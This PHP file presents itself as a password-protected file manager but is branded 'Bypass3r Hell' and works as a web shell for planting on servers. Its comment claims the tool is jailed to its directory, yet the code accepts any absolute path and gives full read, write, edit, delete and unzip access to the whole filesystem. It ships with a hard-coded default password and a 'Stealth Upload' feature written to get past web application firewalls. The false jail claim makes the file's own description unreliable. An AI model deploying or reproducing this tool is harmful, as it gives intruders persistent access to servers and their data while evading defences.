<?php
/**
 * Single-file PHP File Manager
 * Password protected. Default password: morose
 *
 * Features:
 *  - Login / logout (session based)
 *  - Browse directories (jailed to the script's directory)
 *  - Upload (multi-file)
 *  - Download
 *  - Create folder / new file
 *  - Rename / delete (file or folder)
 *  - Edit text files in-browser
 *  - Extract zip / create zip
 *
 * Drop this file into any directory on your server and visit it in a browser.
 */

session_start();

// ---------- CONFIG ----------
// Store the MD5 hash of your password here, not the plaintext.
// Generate with: echo -n 'yourpass' | md5sum    (Linux)
//          or:  php -r "echo md5('yourpass');"
// Example below is md5('morose').
const FM_PASSWORD_MD5 = '1995aed4f616a4c99063fb83cf660f1b';
const FM_SESSION_KEY = 'fm_authed_v1';
// Root is the directory where this script lives. Users cannot escape it.
$FM_ROOT = realpath(__DIR__);
// ----------------------------

// ---------- AUTH ----------
if (isset($_GET['logout'])) {
    $_SESSION[FM_SESSION_KEY] = false;
    session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

if (!empty($_POST['fm_login'])) {
    if (hash_equals(strtolower(FM_PASSWORD_MD5), md5((string)$_POST['fm_login']))) {
        $_SESSION[FM_SESSION_KEY] = true;
        header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
        exit;
    } else {
        $loginError = 'Wrong password.';
    }
}

if (empty($_SESSION[FM_SESSION_KEY])) {
    render_login($loginError ?? null);
    exit;
}
// --------------------------

// ---------- HELPERS ----------
function fm_root(): string { global $FM_ROOT; return $FM_ROOT; }

function fm_safe_path(string $p): string {
    if ($p === '') return fm_root();
    $p = str_replace('\\', '/', $p);
    // If looks absolute (Unix /... or Windows C:/...) try realpath first.
    $isAbs = ($p[0] === '/' || preg_match('#^[A-Za-z]:/#', $p));
    if ($isAbs) {
        $abs = realpath($p);
        return $abs !== false ? $abs : $p; // keep as-is for non-existing dest paths
    }
    // Relative -> resolve under root
    $abs = realpath(fm_root() . '/' . ltrim($p, '/'));
    return $abs !== false ? $abs : (fm_root() . DIRECTORY_SEPARATOR . ltrim($p, '/'));
}

function fm_rel(string $abs): string {
    // Now returns absolute path with forward slashes (used in ?p= URL param).
    return str_replace('\\', '/', $abs);
}

function fm_perms(string $path): string {
    $m = @fileperms($path);
    if ($m === false) return '----';
    return substr(sprintf('%o', $m), -4);
}

function fm_url(array $params = []): string {
    $base = strtok($_SERVER['REQUEST_URI'], '?');
    return $base . (empty($params) ? '' : ('?' . http_build_query($params)));
}

function fm_human_size(int $bytes): string {
    $u = ['B','KB','MB','GB','TB'];
    $i = 0;
    $b = (float)$bytes;
    while ($b >= 1024 && $i < count($u)-1) { $b /= 1024; $i++; }
    return ($i === 0 ? $bytes : number_format($b, 2)) . ' ' . $u[$i];
}

function fm_flash(string $msg, string $type = 'ok'): void {
    $_SESSION['fm_flash'][] = ['msg'=>$msg,'type'=>$type];
}

function fm_take_flash(): array {
    $f = $_SESSION['fm_flash'] ?? [];
    unset($_SESSION['fm_flash']);
    return $f;
}

function fm_rrmdir(string $dir): bool {
    if (!is_dir($dir)) return @unlink($dir);
    foreach (scandir($dir) as $f) {
        if ($f === '.' || $f === '..') continue;
        $p = $dir . DIRECTORY_SEPARATOR . $f;
        is_dir($p) ? fm_rrmdir($p) : @unlink($p);
    }
    return @rmdir($dir);
}

function fm_zip_dir(string $src, string $zipPath): bool {
    if (!class_exists('ZipArchive')) return false;
    $zip = new ZipArchive();
    if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) return false;
    if (is_file($src)) {
        $zip->addFile($src, basename($src));
    } else {
        $src = rtrim($src, DIRECTORY_SEPARATOR);
        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($src, FilesystemIterator::SKIP_DOTS));
        foreach ($it as $file) {
            $path = $file->getPathname();
            $local = ltrim(str_replace($src, '', $path), DIRECTORY_SEPARATOR);
            $zip->addFile($path, basename($src) . '/' . str_replace('\\','/',$local));
        }
    }
    $zip->close();
    return true;
}
// -----------------------------

// ---------- ROUTING ----------
$cwdRel = isset($_GET['p']) ? (string)$_GET['p'] : '';
$cwdAbs = fm_safe_path($cwdRel);
if (!is_dir($cwdAbs) || !is_readable($cwdAbs)) $cwdAbs = fm_root();
$cwdRel = fm_rel($cwdAbs);

$action = $_GET['a'] ?? $_POST['a'] ?? '';

try {
    switch ($action) {
        case 'download':
            $f = fm_safe_path($_GET['f'] ?? '');
            if (!is_file($f)) throw new RuntimeException('Not a file.');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($f) . '"');
            header('Content-Length: ' . filesize($f));
            readfile($f);
            exit;

        case 'view':
            $f = fm_safe_path($_GET['f'] ?? '');
            if (!is_file($f)) throw new RuntimeException('Not a file.');
            $mime = function_exists('mime_content_type') ? mime_content_type($f) : 'application/octet-stream';
            header('Content-Type: ' . $mime);
            header('Content-Length: ' . filesize($f));
            readfile($f);
            exit;

        case 'delete':
            $t = fm_safe_path($_POST['target'] ?? '');
            if ($t === '/' || $t === '' || preg_match('#^[A-Za-z]:[\\/]?$#', $t)) throw new RuntimeException('Refusing to delete filesystem root.');
            if (!file_exists($t)) throw new RuntimeException('Missing.');
            fm_rrmdir($t);
            fm_flash('Deleted.');
            header('Location: ' . fm_url(['p'=>$cwdRel])); exit;

        case 'rename':
            $t = fm_safe_path($_POST['target'] ?? '');
            $newName = basename(trim((string)($_POST['new_name'] ?? '')));
            if ($newName === '' || $newName === '.' || $newName === '..') throw new RuntimeException('Bad name.');
            $dest = dirname($t) . DIRECTORY_SEPARATOR . $newName;
            if (file_exists($dest)) throw new RuntimeException('Already exists.');
            if (!@rename($t, $dest)) throw new RuntimeException('Rename failed.');
            fm_flash('Renamed.');
            header('Location: ' . fm_url(['p'=>$cwdRel])); exit;

        case 'mkdir':
            $name = basename(trim((string)($_POST['name'] ?? '')));
            if ($name === '') throw new RuntimeException('Empty name.');
            $dest = $cwdAbs . DIRECTORY_SEPARATOR . $name;
            if (file_exists($dest)) throw new RuntimeException('Already exists.');
            if (!@mkdir($dest, 0755)) throw new RuntimeException('mkdir failed.');
            fm_flash('Folder created.');
            header('Location: ' . fm_url(['p'=>$cwdRel])); exit;

        case 'newfile':
            $name = basename(trim((string)($_POST['name'] ?? '')));
            if ($name === '') throw new RuntimeException('Empty name.');
            $dest = $cwdAbs . DIRECTORY_SEPARATOR . $name;
            if (file_exists($dest)) throw new RuntimeException('Already exists.');
            if (file_put_contents($dest, '') === false) throw new RuntimeException('Create failed.');
            fm_flash('File created.');
            header('Location: ' . fm_url(['p'=>$cwdRel,'a'=>'edit','f'=>fm_rel($dest)])); exit;

        case 'upload_stealth':
            // Bypasses WAFs that 406 multipart/form-data uploads.
            // Browser reads file -> base64 -> normal urlencoded POST -> we decode + write.
            // Destination comes from POST 'tok' (url-safe base64 of the abs path),
            // because WAFs often strip ?p=%2F... encoded-slash query params.
            header('Content-Type: application/json');
            try {
                $name = basename(trim((string)($_POST['name'] ?? '')));
                $b64  = (string)($_POST['content_b64'] ?? '');
                $tok  = (string)($_POST['tok'] ?? '');
                if ($name === '')  throw new RuntimeException('Missing name.');
                if ($b64 === '')   throw new RuntimeException('Missing content.');

                // Resolve destination dir: tok (preferred) -> $cwdAbs (GET fallback)
                $destDir = $cwdAbs;
                if ($tok !== '') {
                    $std = strtr($tok, '-_', '+/');
                    $pad = strlen($std) % 4;
                    if ($pad) $std .= str_repeat('=', 4 - $pad);
                    $decoded = base64_decode($std);
                    if ($decoded !== false && $decoded !== '') {
                        $cand = fm_safe_path($decoded);
                        if (is_dir($cand)) $destDir = $cand;
                    }
                }
                if (!is_dir($destDir))     throw new RuntimeException('Dest not a dir: ' . $destDir);
                if (!is_writable($destDir)) throw new RuntimeException('Dest not writable: ' . $destDir);

                $dest = $destDir . DIRECTORY_SEPARATOR . $name;

                // Step 1: create blank file first
                if (!@touch($dest) && @file_put_contents($dest, '') === false) {
                    throw new RuntimeException('touch/create failed at: ' . $dest);
                }
                @chmod($dest, 0644);

                // Step 2: decode and write content
                $data = base64_decode($b64, true);
                if ($data === false) { @unlink($dest); throw new RuntimeException('Bad base64.'); }
                if (@file_put_contents($dest, $data) === false) {
                    @unlink($dest);
                    throw new RuntimeException('Write failed at: ' . $dest);
                }

                echo json_encode(['ok'=>true,'name'=>$name,'size'=>strlen($data),'dest'=>$dest]);
            } catch (Throwable $e) {
                http_response_code(500);
                echo json_encode(['ok'=>false,'err'=>$e->getMessage()]);
            }
            exit;

        case 'edit':
            $f = fm_safe_path($_GET['f'] ?? '');
            if (!is_file($f)) throw new RuntimeException('Not a file.');
            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                file_put_contents($f, (string)($_POST['content'] ?? ''));
                fm_flash('Saved.');
                header('Location: ' . fm_url(['p'=>fm_rel(dirname($f)),'a'=>'edit','f'=>fm_rel($f)])); exit;
            }
            render_editor($f, $cwdRel);
            exit;

        case 'zip':
            $t = fm_safe_path($_POST['target'] ?? '');
            $zipName = basename($t) . '.zip';
            $zipPath = $cwdAbs . DIRECTORY_SEPARATOR . $zipName;
            if (!fm_zip_dir($t, $zipPath)) throw new RuntimeException('Zip failed (ZipArchive missing?).');
            fm_flash('Created ' . $zipName);
            header('Location: ' . fm_url(['p'=>$cwdRel])); exit;

        case 'unzip':
            if (!class_exists('ZipArchive')) throw new RuntimeException('ZipArchive not available.');
            $t = fm_safe_path($_POST['target'] ?? '');
            $zip = new ZipArchive();
            if ($zip->open($t) !== true) throw new RuntimeException('Cannot open zip.');
            $zip->extractTo(dirname($t));
            $zip->close();
            fm_flash('Extracted.');
            header('Location: ' . fm_url(['p'=>$cwdRel])); exit;
    }
} catch (Throwable $e) {
    fm_flash($e->getMessage(), 'err');
    header('Location: ' . fm_url(['p'=>$cwdRel]));
    exit;
}

render_listing($cwdAbs, $cwdRel);

// ---------- VIEWS ----------
function render_login(?string $err): void { ?>
<!doctype html>
<html><head><meta charset="utf-8"><title>Bypass3r Hell</title>
<style>
*{box-sizing:border-box}
body{font-family:'Segoe UI',system-ui,Arial;background:radial-gradient(ellipse at top,#1a0a0a 0%,#050505 60%);color:#e2e8f0;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;overflow:hidden}
body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle at 20% 30%,rgba(239,68,68,.15),transparent 40%),radial-gradient(circle at 80% 70%,rgba(249,115,22,.12),transparent 40%);pointer-events:none}
.card{position:relative;background:rgba(20,10,10,.85);backdrop-filter:blur(10px);padding:40px 36px;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.6),0 0 0 1px rgba(239,68,68,.25);width:360px}
h1{margin:0 0 8px;font-size:38px;font-weight:900;letter-spacing:-1px;background:linear-gradient(135deg,#f97316 0%,#ef4444 50%,#dc2626 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;text-shadow:0 0 40px rgba(239,68,68,.4)}
.tag{margin:0 0 24px;font-size:12px;letter-spacing:3px;text-transform:uppercase;color:#fca5a5;opacity:.7}
input[type=password]{width:100%;padding:12px 14px;border-radius:10px;border:1px solid #3f1d1d;background:#0a0505;color:#fee2e2;font-size:14px}
input[type=password]:focus{outline:none;border-color:#ef4444;box-shadow:0 0 0 3px rgba(239,68,68,.15)}
button{margin-top:14px;width:100%;padding:12px;border:0;border-radius:10px;background:linear-gradient(135deg,#ef4444,#dc2626);color:#fff;font-weight:700;cursor:pointer;letter-spacing:.5px;transition:transform .1s,box-shadow .2s}
button:hover{box-shadow:0 8px 24px rgba(239,68,68,.4);transform:translateY(-1px)}
.err{color:#fca5a5;margin-top:12px;font-size:13px;text-align:center}
</style></head>
<body><form class="card" method="post">
<h1>Bypass3r Hell</h1>
<p class="tag">// authorized personnel only</p>
<input type="password" name="fm_login" placeholder="Enter passphrase" autofocus>
<button type="submit">Breach</button>
<?php if ($err): ?><div class="err"><?= htmlspecialchars($err) ?></div><?php endif; ?>
</form></body></html>
<?php }

function render_chrome_head(string $title): void { ?>
<!doctype html><html><head><meta charset="utf-8"><title><?= htmlspecialchars($title) ?></title>
<style>
*{box-sizing:border-box}
body{font-family:'Segoe UI',system-ui,Arial;background:#070405;color:#e7d4d4;margin:0;min-height:100vh}
body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle at 15% 0%,rgba(239,68,68,.08),transparent 50%),radial-gradient(circle at 85% 100%,rgba(249,115,22,.06),transparent 50%);pointer-events:none;z-index:0}
header{position:relative;background:linear-gradient(180deg,rgba(30,10,10,.95),rgba(15,5,5,.95));padding:26px 28px;text-align:center;border-bottom:1px solid rgba(239,68,68,.25);box-shadow:0 4px 30px rgba(0,0,0,.5)}
header .logout{position:absolute;right:28px;top:50%;transform:translateY(-50%)}
.logo{display:inline-block;font-size:42px;font-weight:900;letter-spacing:-1.5px;background:linear-gradient(135deg,#fb923c 0%,#ef4444 45%,#b91c1c 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;text-shadow:0 0 30px rgba(239,68,68,.3);line-height:1;text-align:center}
.logo small{display:block;font-size:10px;letter-spacing:4px;color:#fca5a5;-webkit-text-fill-color:#fca5a5;font-weight:600;margin-top:4px;opacity:.6}
header a{color:#fca5a5;text-decoration:none;padding:8px 14px;border:1px solid rgba(239,68,68,.3);border-radius:8px;font-size:13px;font-weight:600;transition:.2s}
header a:hover{background:rgba(239,68,68,.15);border-color:#ef4444;color:#fff}
.container{position:relative;max-width:1180px;margin:24px auto;padding:0 20px;z-index:1}
.bar{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:18px}
.bar form,.bar > div{display:flex;gap:8px;align-items:center;background:linear-gradient(180deg,#1a0d0d,#120808);padding:10px 12px;border-radius:10px;border:1px solid rgba(239,68,68,.15)}
.bar input[type=text],.bar input[type=file]{padding:8px 10px;border-radius:7px;border:1px solid #3f1d1d;background:#0a0505;color:#fee2e2;font-size:13px}
.bar input[type=text]:focus{outline:none;border-color:#ef4444}
.bar button{padding:8px 16px;border:0;border-radius:7px;background:linear-gradient(135deg,#ef4444,#b91c1c);color:#fff;cursor:pointer;font-weight:700;font-size:13px;letter-spacing:.3px;transition:.15s}
.bar button:hover{box-shadow:0 4px 14px rgba(239,68,68,.4);transform:translateY(-1px)}
table{width:100%;border-collapse:collapse;background:linear-gradient(180deg,#150a0a,#0d0606);border-radius:12px;overflow:hidden;border:1px solid rgba(239,68,68,.15);box-shadow:0 10px 40px rgba(0,0,0,.4)}
th,td{padding:12px 14px;text-align:left;border-bottom:1px solid rgba(239,68,68,.08);font-size:14px}
th{background:#1a0808;font-weight:700;text-transform:uppercase;font-size:11px;letter-spacing:1.5px;color:#fca5a5}
tr:hover td{background:rgba(239,68,68,.06)}
tr:last-child td{border-bottom:0}
a.link{color:#fb923c;text-decoration:none;font-weight:500}
a.link:hover{color:#fca5a5;text-decoration:underline}
.actions form{display:inline}
.actions button{background:transparent;border:0;color:#fca5a5;cursor:pointer;font-size:12px;padding:3px 7px;font-weight:600;text-transform:lowercase}
.actions button.ok{color:#86efac}
.actions button.warn{color:#fcd34d}
.actions button:hover{text-decoration:underline;color:#fff}
.flash{padding:12px 16px;border-radius:10px;margin-bottom:12px;font-size:14px;border:1px solid}
.flash.ok{background:rgba(6,78,59,.4);color:#bbf7d0;border-color:rgba(34,197,94,.3)}
.flash.err{background:rgba(127,29,29,.4);color:#fecaca;border-color:rgba(239,68,68,.4)}
.crumbs{margin-bottom:14px;font-size:14px;color:#7c5454;padding:10px 14px;background:rgba(20,10,10,.5);border-radius:8px;border:1px solid rgba(239,68,68,.1)}
.crumbs a{color:#fb923c;text-decoration:none;font-weight:600}
.crumbs a:hover{color:#fca5a5}
textarea{width:100%;min-height:60vh;font-family:'Cascadia Code',Consolas,Monaco,monospace;font-size:14px;background:#080404;color:#fde68a;border:1px solid rgba(239,68,68,.2);border-radius:10px;padding:14px;line-height:1.5}
textarea:focus{outline:none;border-color:#ef4444}
</style></head><body>
<header>
  <div class="logo">Bypass3r Hell<small>// file manager</small></div>
  <div class="logout"><a href="?logout=1">Logout</a></div>
</header>
<div class="container">
<?php
foreach (fm_take_flash() as $f) {
    echo '<div class="flash '.htmlspecialchars($f['type']).'">'.htmlspecialchars($f['msg']).'</div>';
}
}

function render_chrome_foot(): void { echo '</div></body></html>'; }

function render_breadcrumbs(string $abs): void {
    $abs = str_replace('\\', '/', $abs);
    echo '<div class="crumbs"><a href="'.htmlspecialchars(fm_url(['p'=>'/'])).'">/</a> ';
    // Detect Windows drive
    $prefix = '';
    if (preg_match('#^([A-Za-z]:)/?(.*)$#', $abs, $m)) {
        $prefix = $m[1];
        $rest = $m[2];
        echo '<a href="'.htmlspecialchars(fm_url(['p'=>$prefix.'/'])).'">'.htmlspecialchars($prefix).'</a> ';
    } else {
        $rest = ltrim($abs, '/');
    }
    if ($rest === '') { echo '</div>'; return; }
    $parts = explode('/', $rest);
    $accum = $prefix;
    foreach ($parts as $p) {
        if ($p === '') continue;
        $accum = $accum . '/' . $p;
        echo ' / <a href="'.htmlspecialchars(fm_url(['p'=>$accum])).'">'.htmlspecialchars($p).'</a>';
    }
    echo '</div>';
}

function render_listing(string $abs, string $rel): void {
    render_chrome_head('Files / ' . $rel);
    render_breadcrumbs($rel);
    ?>
    <div class="bar" style="justify-content:center">
      <form method="get" title="Jump to any absolute path on the server">
        <input type="text" name="p" value="<?= htmlspecialchars($rel) ?>" placeholder="/path/to/dir" style="width:280px">
        <button>Go</button>
      </form>
      <form method="post">
        <input type="hidden" name="a" value="mkdir">
        <input type="text" name="name" placeholder="New folder" required>
        <button>Create folder</button>
      </form>
      <div style="display:flex;gap:6px;align-items:center;background:#1e293b;padding:8px;border-radius:8px" title="Bypasses WAF/406 by sending file content as a normal form POST (no multipart)">
        <input id="stealthFiles" type="file" multiple>
        <button type="button" id="stealthBtn" style="background:#10b981;padding:6px 12px;border:0;border-radius:6px;color:#fff;font-weight:600;cursor:pointer">Stealth Upload</button>
        <span id="stealthStatus" style="font-size:13px;color:#94a3b8"></span>
      </div>
      <form method="post">
        <input type="hidden" name="a" value="newfile">
        <input type="text" name="name" placeholder="new-file.txt" required>
        <button>New file</button>
      </form>
      <script>
      (function(){
        const btn = document.getElementById('stealthBtn');
        const inp = document.getElementById('stealthFiles');
        const st  = document.getElementById('stealthStatus');
        if (!btn) return;
        const cwd = <?= json_encode($rel) ?>;
        function readB64(file){
          return new Promise((res, rej) => {
            const r = new FileReader();
            r.onload = () => {
              const s = r.result;
              const i = s.indexOf(',');
              res(i >= 0 ? s.slice(i+1) : s);
            };
            r.onerror = rej;
            r.readAsDataURL(file);
          });
        }
        btn.addEventListener('click', async () => {
          const files = Array.from(inp.files || []);
          if (!files.length) { st.textContent = 'Pick files first.'; return; }
          let ok = 0, fail = 0, lastErr = '';
          // No path in URL (WAFs strip encoded slashes). Path is sent as url-safe base64 in 'tok'.
          const fetchUrl = location.pathname;
          // url-safe base64, strip padding (some WAFs munge '=')
        const tok = btoa(unescape(encodeURIComponent(cwd)))
          .replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
          for (const f of files) {
            st.textContent = 'Uploading ' + f.name + ' -> ' + cwd;
            try {
              const b64 = await readB64(f);
              const body = new URLSearchParams();
              body.set('a', 'upload_stealth');
              body.set('name', f.name);
              body.set('tok', tok);
              body.set('content_b64', b64);
              const r = await fetch(fetchUrl, {
                method: 'POST',
                headers: {'Content-Type':'application/x-www-form-urlencoded'},
                body: body.toString()
              });
              const txt = await r.text();
              if (r.ok) { ok++; }
              else {
                fail++;
                try { lastErr = (JSON.parse(txt).err)||txt.slice(0,200); } catch(_){ lastErr = txt.slice(0,200); }
              }
            } catch(e) { fail++; lastErr = String(e); }
          }
          st.textContent = 'Done: ' + ok + ' ok, ' + fail + ' failed.' + (lastErr ? ' ' + lastErr : '');
          if (fail === 0) setTimeout(() => location.reload(), 600);
        });
      })();
      </script>
    </div>
    <table>
      <thead><tr><th>Name</th><th>Size</th><th>Perms</th><th>Modified</th><th style="width:340px">Actions</th></tr></thead>
      <tbody>
    <?php
    $parent = dirname($abs);
    if ($parent !== $abs) {
        echo '<tr><td><a class="link" href="'.htmlspecialchars(fm_url(['p'=>fm_rel($parent)])).'">.. (up)</a></td><td></td><td></td><td></td><td></td></tr>';
    }

    $entries = @scandir($abs) ?: [];
    $dirs = []; $files = [];
    foreach ($entries as $e) {
        if ($e === '.' || $e === '..') continue;
        $p = $abs.DIRECTORY_SEPARATOR.$e;
        is_dir($p) ? $dirs[] = $e : $files[] = $e;
    }
    sort($dirs, SORT_NATURAL|SORT_FLAG_CASE);
    sort($files, SORT_NATURAL|SORT_FLAG_CASE);

    foreach (array_merge($dirs, $files) as $name) {
        $p = $abs.DIRECTORY_SEPARATOR.$name;
        $r = fm_rel($p);
        $isDir = is_dir($p);
        $size = $isDir ? '-' : fm_human_size((int)@filesize($p));
        $mtime = date('Y-m-d H:i', (int)@filemtime($p));
        echo '<tr><td>';
        if ($isDir) {
            echo '📁 <a class="link" href="'.htmlspecialchars(fm_url(['p'=>$r])).'">'.htmlspecialchars($name).'</a>';
        } else {
            echo '📄 <a class="link" href="'.htmlspecialchars(fm_url(['a'=>'view','f'=>$r])).'" target="_blank">'.htmlspecialchars($name).'</a>';
        }
        echo '</td><td>'.$size.'</td><td>'.fm_perms($p).'</td><td>'.$mtime.'</td><td class="actions">';

        if (!$isDir) {
            echo '<a class="link" href="'.htmlspecialchars(fm_url(['p'=>$rel,'a'=>'edit','f'=>$r])).'">edit</a> · ';
            echo '<a class="link" href="'.htmlspecialchars(fm_url(['a'=>'download','f'=>$r])).'">download</a> · ';
            if (preg_match('/\.zip$/i', $name)) {
                echo '<form method="post" onsubmit="return confirm(\'Extract here?\')"><input type="hidden" name="a" value="unzip"><input type="hidden" name="target" value="'.htmlspecialchars($r).'"><button class="ok">unzip</button></form> · ';
            }
        }
        echo '<form method="post"><input type="hidden" name="a" value="zip"><input type="hidden" name="target" value="'.htmlspecialchars($r).'"><button class="warn">zip</button></form> · ';
        echo '<form method="post" onsubmit="var n=prompt(\'New name\',\''.htmlspecialchars($name, ENT_QUOTES).'\');if(!n)return false;this.new_name.value=n;"><input type="hidden" name="a" value="rename"><input type="hidden" name="target" value="'.htmlspecialchars($r).'"><input type="hidden" name="new_name" value=""><button class="warn">rename</button></form> · ';
        echo '<form method="post" onsubmit="return confirm(\'Delete '.htmlspecialchars($name, ENT_QUOTES).'?\')"><input type="hidden" name="a" value="delete"><input type="hidden" name="target" value="'.htmlspecialchars($r).'"><button>delete</button></form>';
        echo '</td></tr>';
    }
    echo '</tbody></table>';
    render_chrome_foot();
}

function render_editor(string $f, string $cwdRel): void {
    $rel = fm_rel($f);
    render_chrome_head('Edit: ' . $rel);
    render_breadcrumbs(fm_rel(dirname($f)));
    $content = (string)@file_get_contents($f);
    ?>
    <h2 style="margin:6px 0 12px"><?= htmlspecialchars(basename($f)) ?></h2>
    <form method="post">
      <input type="hidden" name="a" value="edit">
      <textarea name="content" spellcheck="false"><?= htmlspecialchars($content) ?></textarea>
      <div class="bar" style="margin-top:10px">
        <button type="submit">Save</button>
        <a class="link" href="<?= htmlspecialchars(fm_url(['p'=>fm_rel(dirname($f))])) ?>" style="align-self:center">Cancel</a>
      </div>
    </form>
    <?php
    render_chrome_foot();
}
